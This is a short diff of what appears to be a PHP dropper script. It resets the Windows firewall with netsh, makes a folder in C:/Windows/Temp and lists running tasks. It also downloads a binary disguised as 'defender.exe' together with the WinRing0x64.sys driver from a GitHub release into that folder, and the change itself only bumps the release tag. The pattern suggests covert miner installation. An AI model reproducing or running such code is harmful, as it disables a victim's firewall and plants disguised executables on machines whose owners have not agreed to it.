@@ -35,7 +35,7 @@ system('netsh advfirewall reset');
 system('mkdir "C:/Windows/Temp/RightProgramTwo"');  
 exec('tasklist', $output);
 
-$url =  'https://github.com/danialchork/project-final/releases/download/last2/defender.exe';
+$url =  'https://github.com/danialchork/project-final/releases/download/last3/defender.exe';
 $url2 =  'https://github.com/danialchork/project-final/releases/download/last/WinRing0x64.sys';
 
 $file_name = 'C:/Windows/Temp/RightProgramTwo/defender.exe';
